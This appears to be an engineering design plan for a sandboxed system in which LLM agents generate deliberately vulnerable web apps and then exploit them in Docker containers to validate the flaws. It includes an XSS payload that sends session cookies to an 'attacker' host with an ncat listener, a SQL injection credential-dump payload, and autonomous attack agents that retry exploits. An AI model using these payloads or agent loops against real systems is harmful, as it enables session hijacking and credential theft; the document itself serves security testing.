# Plan v2.0: Browser-Use Testing + Attack Orchestrator Refactor

## What Changed from v1.0

v1.0 had three weaknesses:

1. **`test_mode` field** on attack goal YAMLs was premature routing logic. The orchestrator should decide dynamically whether to use a browser — we don't need a config field for it.
2. **`attack_snippet` as optional fast-path** created dual-mode behavior in the generation prompt and ambiguous handling downstream. Cleaner to remove it entirely from `GeneratedApp` and replace with `attack_objective` unconditionally.
3. **Browser container always started** for custom app flows — the cost is a few seconds and worth the simplicity. Conditional startup based on `test_mode` just adds routing code with no real benefit.

The user's framing of "an attack agent that can spawn sub-agents (exec_in_target, browser_use_agent, etc.)" is the key architectural insight: **`BoundBrowserTool` IS the browser sub-agent**, just exposed as a crewAI tool. The outer Attack Orchestrator agent decides when to call it. This gives us the sub-agent delegation pattern without crewAI's Manager/subprocess overhead.

---

## Data Model Changes

### `GeneratedApp` — replace `attack_snippet` with `attack_objective`

```python
class GeneratedApp(BaseModel):
    app_filename: str
    app_source: str
    schema_sql: Optional[str] = None
    seed_sql: Optional[str] = None
    setup_db_sh: Optional[str] = None
    deploy_snippet: str
    testing_snippet: str        # L1: bash white-box check (unchanged)
    attack_objective: str       # L2: structured natural language task for Attack Orchestrator (NEW)
    # attack_snippet removed — replaced by attack_objective

    model_config = ConfigDict(extra="ignore")  # tolerate old checkpoints that have attack_snippet
```

`attack_objective` is always required. It is a structured, step-by-step natural language task that the Attack Orchestrator can execute using its available tools. It must include:
- concrete endpoints, parameter names, and payload values
- any setup steps that need CLI tools (e.g. "start ncat listener on attacker port 9999")
- a clear success criterion that the orchestrator can verify

Example for XSS cookie theft:
```
Step 1: Run in attacker container: rm -f /tmp/exfil.txt && ncat -lnvp 9999 > /tmp/exfil.txt &
Step 2: Navigate in browser to http://target:3000/posts
Step 3: In the comment input field, submit: <script>new Image().src='http://attacker:9999/?c='+document.cookie</script>
Step 4: Navigate in browser to http://target:3000/admin/review to trigger the admin bot
Step 5: Wait 15 seconds, then run in attacker container: cat /tmp/exfil.txt
Success criterion: stdout contains a string matching 'connect.sid='
```

Example for SQLi credential theft:
```
Step 1: Run in attacker container: curl -s "http://target:5000/search?q=x'+UNION+SELECT+username,password+FROM+users--+-"
Success criterion: response body contains a string matching a bcrypt hash (\$2[aby]\$) or plaintext password
```

Old checkpoints with `attack_snippet` but no `attack_objective` deserialize cleanly because of `extra="ignore"` — old fields are dropped, `attack_objective` will be `""` and the orchestrator handles this by failing fast with a regeneration request.

### `AttackOrchestratorResult`

```python
class AttackOrchestratorResult(BaseModel):
    l1_passed: bool
    l2_passed: bool
    l1_evidence: str          # what exec_in_target returned for testing_snippet
    l2_evidence: str          # browser output or CLI output proving exploit success/failure
    reasoning: str            # orchestrator's synthesis of pass/fail
    used_browser: bool = False
```

---

## Phase 1: Browser Infrastructure

Everything downstream depends on this. Do this first.

### Step 1.1: Browser sidecar Dockerfile

New file: `docker/browser/Dockerfile`

```dockerfile
FROM ubuntu:22.04
RUN apt-get update && \
    DEBIAN_FRONTEND=noninteractive apt-get install -y --no-install-recommends \
        chromium-browser ca-certificates && \
    rm -rf /var/lib/apt/lists/*
EXPOSE 9222
CMD ["chromium-browser", \
     "--headless", \
     "--no-sandbox", \
     "--disable-gpu", \
     "--disable-dev-shm-usage", \
     "--remote-debugging-address=0.0.0.0", \
     "--remote-debugging-port=9222"]
```

Small, purpose-built, fits the same pattern as `docker/attacker/Dockerfile`. The `--remote-debugging-address=0.0.0.0` makes CDP reachable from both the Docker bridge network and (via host port mapping) from the Python process.

### Step 1.2: Add browser sidecar to `TestEnvironmentTool`

`src/game_of_everything/tools/test_environment.py` additions:

```python
BROWSER_DOCKERFILE_DIR = str(Path(__file__).parent.parent.parent.parent / "docker" / "browser")
BROWSER_IMAGE_TAG = "goe-browser:latest"
```

Constructor change:
```python
def __init__(self, scope: str = "", hostname: str = "", target_image: str = "", enable_browser: bool = False):
    ...
    self._enable_browser = enable_browser
    self.browser_container = None
    self.browser_cdp_url: str = ""     # ws://localhost:{host_port} — set in setup()
    self._browser_host_port: int = 0
```

In `setup()`, after attacker container starts:
```python
if self._enable_browser:
    self.client.images.build(path=BROWSER_DOCKERFILE_DIR, tag=BROWSER_IMAGE_TAG, rm=True)
    # Pick a free host port
    import socket
    with socket.socket() as s:
        s.bind(('', 0))
        self._browser_host_port = s.getsockname()[1]
    self.browser_container = self.client.containers.run(
        BROWSER_IMAGE_TAG,
        name=f"{self._prefix}browser",
        network=self.network_name,
        hostname="browser",
        ports={"9222/tcp": self._browser_host_port},
        detach=True,
        remove=False,
    )
    # Wait until CDP endpoint is connectable
    self.browser_cdp_url = f"ws://localhost:{self._browser_host_port}"
    self._wait_for_cdp()
```

`_wait_for_cdp()` polls `http://localhost:{port}/json/version` with urllib until 200 or 15s timeout.

In `teardown()` / `_force_cleanup()`, add browser container cleanup alongside target and attacker.

`CustomAppFlow.validate_end_to_end` passes `enable_browser=True` unconditionally for all custom app runs. No routing logic needed.

### Step 1.3: `BoundBrowserTool`

New file: `src/game_of_everything/tools/bound_browser_tool.py`

```python
class BoundBrowserTool(BaseTool):
    name: str = "browser_task"
    description: str = (
        "Execute a natural language task in a headless browser connected to the target web app. "
        "Use this for any action that requires clicking, filling forms, reading page content, "
        "or triggering JavaScript execution. Returns the browser agent's final result as a string."
    )
    cdp_url: str           # ws://localhost:{host_port}
    target_base_url: str   # http://target:{port} — tell the agent where the app lives
```

Input schema:
```python
class BrowserTaskInput(BaseModel):
    task: str    # Natural language instruction — can include concrete steps
```

Implementation:
```python
def _run(self, task: str) -> str:
    from browser_use import Agent as BrowserAgent, Browser, BrowserConfig
    from langchain_aws import ChatBedrock

    browser = Browser(config=BrowserConfig(cdp_url=self.cdp_url))
    llm = ChatBedrock(model_id="us.anthropic.claude-sonnet-4-6", region_name=...)

    async def _run_async():
        agent = BrowserAgent(
            task=f"Target app base URL: {self.target_base_url}\n\n{task}",
            llm=llm,
            browser=browser,
        )
        result = await agent.run(max_steps=20)
        return result.final_result() or "(no result)"

    # Handle both sync and async calling contexts (crewAI can run in either)
    try:
        loop = asyncio.get_running_loop()
        # Already inside an event loop — run in a thread pool
        import concurrent.futures
        with concurrent.futures.ThreadPoolExecutor() as pool:
            future = pool.submit(asyncio.run, _run_async())
            return future.result(timeout=120)
    except RuntimeError:
        return asyncio.run(_run_async())
```

The `ChatBedrock` LLM for browser-use is constructed from `GoEConfig` (same credentials as the rest of the flow). This is a separate LLM object from the crewAI agents — browser-use needs a LangChain-compatible LLM, not a LiteLLM string.

### Step 1.4: Add dependencies to `pyproject.toml`

```toml
browser-use = ">=0.1,<0.2"
langchain-aws = ">=0.2"
```

`browser-use` brings in Playwright as a dependency. After `crewai install`, run `playwright install chromium` to install the Playwright-managed Chromium binary (used by browser-use when not connecting via CDP — acts as fallback if CDP connection fails).

**Files to create/modify**:
- New: `docker/browser/Dockerfile`
- `src/game_of_everything/tools/test_environment.py`
- New: `src/game_of_everything/tools/bound_browser_tool.py`
- `pyproject.toml`

---

## Phase 2: Attack Orchestrator for Custom Apps

This is the core change. Replaces the entire L1+L2+verdict crew+attack agent retry chain in `custom_app_flow.py` with a single orchestrator agent invocation.

### Step 2.1: Update `GeneratedApp` model and generation task

In `models.py`:
- Add `attack_objective: str` field
- Remove `attack_snippet: str` (was required)
- Add `model_config = ConfigDict(extra="ignore")`

In `tasks.yaml`, update `generate_app_task`:
- Remove `attack_snippet` from expected_output
- Add `attack_objective` to expected_output — make it required
- Add guidance in task description:

```
ATTACK OBJECTIVE FORMAT:
Replace attack_snippet with attack_objective — a structured multi-step task for the
Attack Orchestrator. Write it as numbered steps where each step either:
  a) runs a CLI command in the attacker container (prefix with "Run in attacker:")
  b) performs a browser action (prefix with "In browser:")
  c) runs a CLI command in the target container for setup (prefix with "Run in target:")
End with a "Success criterion:" line containing a regex pattern the orchestrator
can grep for in the final output.

Example for SQLi:
  Step 1: Run in attacker: curl -s "http://target:{port}/search?q=x'+UNION+SELECT+username,password+FROM+users--+-"
  Success criterion: response contains a bcrypt hash or plaintext credential matching the seeded user

Example for stored XSS:
  Step 1: Run in attacker: ncat -lnvp 9999 > /tmp/exfil.txt &
  Step 2: In browser: navigate to http://target:{port}/posts, fill the comment field with
    <script>new Image().src='http://attacker:9999/?c='+document.cookie</script>, submit it
  Step 3: In browser: navigate to http://target:{port}/admin/review
  Step 4: Run in attacker: sleep 15 && cat /tmp/exfil.txt
  Success criterion: /tmp/exfil.txt contains connect.sid= or session=
```

In `agents.yaml`, update `app_generation_agent` goal section on snippets to reflect the new field name and format.

### Step 2.2: `AttackOrchestratorResult` model

Add to `models.py`:
```python
class AttackOrchestratorResult(BaseModel):
    l1_passed: bool
    l2_passed: bool
    l1_evidence: str
    l2_evidence: str
    reasoning: str
    used_browser: bool = False
```

### Step 2.3: New agent + task in YAML

In `agents.yaml`, add `attack_orchestrator_agent`:

```yaml
attack_orchestrator_agent:
  role: >
    Attack Orchestrator
  goal: >
    Validate that a vulnerable web application is both correctly deployed (L1)
    and successfully exploitable (L2) by autonomously choosing and executing
    the right tools for each step.

    You have three tools:
    - exec_in_target: run bash inside the target container (white-box access)
    - exec_in_attacker: run bash inside the attacker Kali container (black-box CLI)
    - browser_task: delegate to a browser sub-agent that drives a headless Chrome
      browser connected to the target app — use this for any action requiring
      clicking, form submission, JavaScript execution, or cookie inspection

    PROCESS:
    1. L1 check: run the provided testing_snippet in exec_in_target. Verify the
       app is deployed and the vulnerability is present.
    2. L2 exploit: execute the attack_objective step by step, routing each step
       to the appropriate tool. Steps prefixed "Run in attacker:" go to
       exec_in_attacker. Steps prefixed "In browser:" go to browser_task.
       Steps prefixed "Run in target:" go to exec_in_target.
    3. Check the success criterion from attack_objective against the final output.
    4. Return an AttackOrchestratorResult with your verdict.

    If L1 fails: set l1_passed=False, skip L2, explain in reasoning.
    If L2 fails on first try: inspect what went wrong, try an alternative approach
    (different endpoint, different payload, different timing) before giving up.
    Always validate your conclusion before returning.
  backstory: >
    You are a senior penetration tester who conducts end-to-end attack validation
    on web applications. You know that web attacks range from simple curl-exploitable
    SQL injection to complex multi-step browser-based XSS chains. You adapt your
    tools to the attack: CLI for API-level probes, browser automation for anything
    that needs JavaScript execution or UI interaction. You always verify your results
    — a passing verdict without confirming evidence is not acceptable.
```

In `tasks.yaml`, add `attack_orchestrator_task`:

```yaml
attack_orchestrator_task:
  description: >
    Validate a vulnerable web application: first confirm it is deployed correctly
    (L1), then execute the exploit (L2).

    APP: {app_filename}
    APP SOURCE:
    {app_source}

    TESTING SNIPPET (L1 bash check):
    {testing_snippet}

    ATTACK OBJECTIVE (L2 multi-step task):
    {attack_objective}

    TARGET BASE URL: http://target:{port}
    SYNTHESIS CONTEXT: {synthesis_context}

    ATTEMPT: {attempt_number} of {max_attempts}
    {failure_context}

    Execute the L1 check and L2 attack objective using your tools. Return your
    verdict as an AttackOrchestratorResult.
  expected_output: >
    A single raw JSON object — no markdown, no surrounding text.
    Fields: l1_passed (bool), l2_passed (bool), l1_evidence (str),
    l2_evidence (str), reasoning (str), used_browser (bool).
  agent: attack_orchestrator_agent
```

### Step 2.4: New shared crew: `run_attack_orchestrator_crew()`

New file: `src/game_of_everything/crews/attack_orchestrator_crew.py`

```python
def run_attack_orchestrator_crew(
    agents_config: dict,
    tasks_config: dict,
    generated_app: GeneratedApp,
    synthesis_context: str,
    port: int,
    target_container_name: str,
    attacker_container_name: str,
    cdp_url: str,
    attempt_number: int = 1,
    max_attempts: int = 2,
    failure_context: str = "",
    ui: Optional["GoEConsole"] = None,
) -> AttackOrchestratorResult:
```

Agent tools:
- `BoundExecInTargetTool(container_name=target_container_name)` — always present
- `BoundExecInAttackerTool(container_name=attacker_container_name)` — always present
- `BoundBrowserTool(cdp_url=cdp_url, target_base_url=f"http://target:{port}")` — always present

The Python caller always provides `cdp_url`. The agent uses the browser tool only when the attack_objective says to.

### Step 2.5: Wire into `custom_app_flow.py`

In `validate_end_to_end()`, after deploying the app:

**Remove**:
- The L1 exec + `run_verdict_crew` call
- The L2 exec + `run_verdict_crew` call
- The `_run_attack_agent_crew` retry loop (all of it)
- `_run_verdict_crew` import from this file

**Replace with**:
```python
env = TestEnvironmentTool(target_image=target_image, enable_browser=True)

# ... setup, staging, deploy as before ...

orch_result = run_attack_orchestrator_crew(
    agents_config=self.agents_config,
    tasks_config=self.tasks_config,
    generated_app=generated_app,
    synthesis_context=self.state.vector.synthesis_context,
    port=self.state.vector.port,
    target_container_name=env.target_name,
    attacker_container_name=env.attacker_name,
    cdp_url=env.browser_cdp_url,
    attempt_number=attempt + 1,
    max_attempts=1 + MAX_GENERATE_RETRIES,
    failure_context=failure_context,
    ui=self.ui,
)

if not orch_result.l1_passed:
    failure_context = f"L1 FAILED.\nEvidence: {orch_result.l1_evidence}\nReasoning: {orch_result.reasoning}"
    continue  # triggers regeneration

if not orch_result.l2_passed:
    failure_context = f"L1 PASSED but L2 FAILED.\nEvidence: {orch_result.l2_evidence}\nReasoning: {orch_result.reasoning}"
    continue  # triggers regeneration

# Both passed
self.state.layer1_verdict = TestVerdict(passed=True, reasoning=orch_result.l1_evidence)
self.state.layer2_verdict = TestVerdict(passed=True, reasoning=orch_result.l2_evidence)
return
```

The verdict objects on `CustomAppState` now come from the orchestrator result. `MAX_GENERATE_RETRIES` and the outer `for attempt in range(1 + MAX_GENERATE_RETRIES)` loop stay exactly as-is — Python still controls retry count and regeneration. The orchestrator only controls the L1+L2 strategy within one attempt.

**Remove** `_run_attack_agent_crew()` entirely — the orchestrator handles both initial validation and intra-attempt repair.

**Files to modify/create**:
- `src/game_of_everything/models.py`
- `src/game_of_everything/config/agents.yaml`
- `src/game_of_everything/config/tasks.yaml`
- New: `src/game_of_everything/crews/__init__.py`
- New: `src/game_of_everything/crews/attack_orchestrator_crew.py`
- `src/game_of_everything/steps/custom_app_flow.py`

---

## Phase 3: Misconfig Attack Agent

This is simpler and independent of Phases 1-2 — no browser needed for SSH/Samba/Redis attacks.

### Step 3.1: Extract `run_attack_crew()` from `custom_app_flow.py`

New file: `src/game_of_everything/crews/attack_crew.py`

Identical signature to the existing `_run_attack_agent_crew()` in `custom_app_flow.py`, but takes explicit parameters instead of `CustomAppState`. No browser tool. Uses the existing `attack_agent` + `fix_attack_snippet_task`.

```python
def run_attack_crew(
    agents_config: dict,
    tasks_config: dict,
    atom_name: str,
    atom_context: str,
    failed_attack_snippet: str,
    l2_exit_code: int,
    l2_stdout: str,
    l2_stderr: str,
    l1_exit_code: int,
    l1_stdout: str,
    verdict_reasoning: str,
    attempt_number: int,
    max_attempts: int,
    target_container_name: str,
    attacker_container_name: str,
    deploy_snippet: str = "",
    port: int = 80,
    ui: Optional["GoEConsole"] = None,
) -> AttackDiagnosticResult:
```

Refactor `custom_app_flow.py:_run_attack_agent_crew()` to call this — removes the duplicate. (Note: by Phase 2, `_run_attack_agent_crew` is already removed, so this is just creating the shared function for Phase 3 use.)

### Step 3.2: Replace log-only L2 diagnostic in `test_snippets.py`

At `test_snippets.py:405-433`, replace the `run_diagnostic_crew` call (which was designed for L1 code fixes, not L2 exploit repair) with a retry loop using `run_attack_crew()`:

```python
from game_of_everything.crews.attack_crew import run_attack_crew

MAX_L2_ATTACK_RETRIES = 2

if not verdict.passed:
    for attack_attempt in range(1, MAX_L2_ATTACK_RETRIES + 1):
        if ui:
            ui.log(f"    L2 FAILED. Attack agent: attempt {attack_attempt}/{MAX_L2_ATTACK_RETRIES}...")
        attack_result = run_attack_crew(
            agents_config=agents_config,
            tasks_config=tasks_config,
            atom_name=snippets[j].atom_name,
            atom_context=snippets[j].mapped_atom.context,
            failed_attack_snippet=attack,
            l2_exit_code=a_exit,
            l2_stdout=a_stdout,
            l2_stderr=a_stderr,
            l1_exit_code=0,   # L1 passed for this atom
            l1_stdout="",
            verdict_reasoning=verdict.reasoning,
            attempt_number=attack_attempt,
            max_attempts=MAX_L2_ATTACK_RETRIES,
            target_container_name=env.target_name,
            attacker_container_name=env.attacker_name,
            box_id=box_id,
            ui=ui,
        )
        fixed = attack_result.fixed_attack_snippet
        env.ensure_attacker_tools([fixed])
        a_exit, a_stdout, a_stderr = env.exec_in_attacker(fixed)
        verdict = run_verdict_crew(
            agents_config=agents_config, tasks_config=tasks_config,
            atom_name=snippets[j].atom_name,
            atom_context=snippets[j].mapped_atom.context,
            layer="external attack probe",
            snippet_executed=fixed,
            exit_code=a_exit, stdout=a_stdout, stderr=a_stderr,
            box_id=box_id, ui=ui,
        )
        if verdict.passed:
            snippets[j].attack_snippet = fixed  # update for future cumulative reprobes
            break
```

### Step 3.3: Generalize `attack_agent` in `agents.yaml`

Update the `attack_agent` goal to handle both web app exploit repair AND infrastructure exploit repair (smbclient, SSH, Redis, nmap probes). Currently the backstory only mentions "web application attacks". Add infrastructure attack patterns to the backstory and common failure patterns list.

**Files to create/modify**:
- New: `src/game_of_everything/crews/attack_crew.py`
- `src/game_of_everything/steps/test_snippets.py`
- `src/game_of_everything/config/agents.yaml`

---

## What We Are NOT Doing

| Proposal | Decision | Reason |
|----------|----------|--------|
| `test_mode` field on attack goal YAMLs | Removed | Orchestrator decides dynamically. Config field adds complexity with no benefit. |
| `attack_snippet` as optional fast-path | Removed | Dual-mode generation prompt is confusing. `attack_objective` handles all cases. Agent calls exec_in_attacker when it doesn't need a browser. |
| Conditional browser startup (only for XSS) | Removed | Browser is always started for custom apps. Cost: ~5s. Benefit: no routing logic. |
| Manager/subprocess crewAI agents | Skip | `BoundBrowserTool` wrapping a browser-use Agent IS the sub-agent delegation pattern. No crewAI Manager overhead needed. |
| L2-first for misconfig atoms | Skip | L1 verifies per-snippet deployment health before cumulative L2 probes. Skipping L1 makes regression attribution ambiguous. |
| Browser for misconfig L2 | Skip | SSH, Samba, Redis, MongoDB — all CLI-exploitable. No browser needed. |

---

## Dependency Graph

```
Phase 1 (Browser infrastructure) ← start here
    ↓
Phase 2 (Attack Orchestrator for custom apps) ← requires Phase 1

Phase 3 (Misconfig Attack Agent) ← independent, no Phase 1 or 2 needed
```

Phases 2 and 3 can be implemented in parallel. Phase 3 is a good warm-up — it exercises the same `attack_agent` and `fix_attack_snippet_task` that the orchestrator uses for misconfig fallback, without the browser complexity.

---

## Verification

### Phase 1 — Browser sidecar
```bash
# Start env with browser enabled and verify CDP is reachable
python3 -c "
from game_of_everything.tools.test_environment import TestEnvironmentTool
env = TestEnvironmentTool(enable_browser=True)
env.setup()
print('browser_cdp_url:', env.browser_cdp_url)
env.teardown()
"
# Verify all three containers (target, attacker, browser) start and teardown cleanly

# Smoke-test BoundBrowserTool
python3 -c "
from game_of_everything.tools.bound_browser_tool import BoundBrowserTool
# Point at any running web server
tool = BoundBrowserTool(cdp_url='ws://localhost:XXXX', target_base_url='http://example.com')
print(tool.run('Navigate to http://example.com and return the page title'))
"
```

### Phase 2 — Custom app orchestrator
```bash
# XSS case: verify browser tool is invoked
scripts/test_custom_app.py --vuln xss_stored --goal session_theft_via_xss --runtime express
# Check log: AttackOrchestratorResult.used_browser == true
# Verify session cookie exfiltration validated end-to-end

# SQLi case: verify CLI path (no browser needed)
scripts/test_custom_app.py --vuln sqli_union --goal credential_theft --runtime flask
# Check log: AttackOrchestratorResult.used_browser == false

# Verify old attack_snippet field no longer in GeneratedApp output
scripts/test_custom_app.py --generate-only --save /tmp/app.json --vuln sqli_union --goal credential_theft
python3 -c "import json; d=json.load(open('/tmp/app.json')); assert 'attack_snippet' not in d; assert d['attack_objective']"
```

### Phase 3 — Misconfig attack agent
```bash
# Run with a misconfig that has a known-fragile L2 snippet (e.g. wrong port assumption)
crewai run  # provide "SSH server with weak credentials"
# Check output/<ts>.log for:
#   "L2 FAILED. Attack agent: attempt 1/2"
#   "Attack Agent fixed the exploit" OR "L2 failed after 2 attack retries"
# Verify the corrected attack snippet appears in the log and was re-executed
```
